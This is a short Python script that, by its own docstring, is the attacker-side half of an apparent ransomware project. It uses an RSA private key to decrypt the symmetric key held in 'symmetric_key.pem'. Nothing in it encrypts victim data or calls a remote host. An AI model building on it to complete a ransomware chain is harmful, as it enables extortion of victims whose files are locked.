from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

"""
This Should be Retained On Attacker Machine For Decryption of Encrypted Symmetric Key Using Attacker's PRivate keyG
"""


def decrypt_sym_key():
    private_key = RSA.import_key(open("private.pem", "rb").read())
    key_decrypter = PKCS1_OAEP.new(private_key)

    # Accessing Encrypted Key
    with open("symmetric_key.pem", "rb") as encrypted_key:
        key = encrypted_key.read()

        decrypted_symm_key = key_decrypter.decrypt(key)

    with open("symmetric_key.pem", "wb") as decrypted_key:
        decrypted_key.write(decrypted_symm_key)


def main():

    try:
        decrypt_sym_key()
    except ValueError as e:
        print("[+] Key Already Decrypted [+]")


if __name__ == "__main__":
    main()
